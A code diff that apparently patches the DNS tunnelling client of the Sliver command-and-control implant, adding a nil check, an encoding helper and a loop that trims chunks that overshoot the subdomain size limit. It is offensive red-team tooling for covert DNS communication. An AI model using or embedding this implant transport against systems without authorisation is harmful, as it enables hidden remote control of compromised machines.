@@ -709,6 +709,9 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, erro
 // SplitBuffer - There's probably a fancy way to calculate this with math and shit but it's much easier to just encode bytes
 // and check the length until we hit the limit
 func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, data []byte) ([]string, error) {
+	if msg == nil {
+		return nil, ErrInvalidMsg
+	}
 	subdata := []string{}
 	start := 0
 	stop := start
@@ -743,14 +746,34 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			// log.Printf("[dns] shave data [%d:%d] of %d", start, stop, len(data))
 			// {{end}}
 			msg.Data = data[start:stop]
-			pbMsg, _ := proto.Marshal(msg)
-			encodedValue, _ := encoder.Encode(pbMsg)
-			encoded = string(encodedValue)
+			var err error
+			encoded, err = encodeDNSMessage(msg, encoder)
+			if err != nil {
+				return nil, err
+			}
 			// {{if .Config.Debug}}
 			// log.Printf("[dns] encoded length is %d (max: %d)", len(encoded), s.subdataSpace)
 			// {{end}}
 		}
+
+		// Step back if a protobuf varint boundary caused encoded to overshoot.
+		// Adding 1 byte across a varint boundary (e.g. Data length 127 to 128) grows
+		// the proto by 2 bytes, which can jump base32 by +3 or +4, exceeding the
+		// subdataSpace-1 guard above.
+		for s.subdataSpace < len(encoded) && stop > start {
+			stop--
+			msg.Data = data[start:stop]
+			var err error
+			encoded, err = encodeDNSMessage(msg, encoder)
+			if err != nil {
+				return nil, err
+			}
+		}
+		if stop <= start {
+			return nil, errMsgTooLong
+		}
 		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
+
 		// {{if .Config.Debug}}
 		encodedSubdata = append(encodedSubdata, encoded)
 		// {{end}}
@@ -787,6 +810,18 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 	// {{end}}
 
 	return subdata, nil
+}
+
+func encodeDNSMessage(msg *dnspb.DNSMessage, encoder encoders.Encoder) (string, error) {
+	pbMsg, err := proto.Marshal(msg)
+	if err != nil {
+		return "", err
+	}
+	encoded, err := encoder.Encode(pbMsg)
+	if err != nil {
+		return "", err
+	}
+	return string(encoded), nil
 }
 
 func (s *SliverDNSClient) randomDNSSessionID() (uint32, error) {
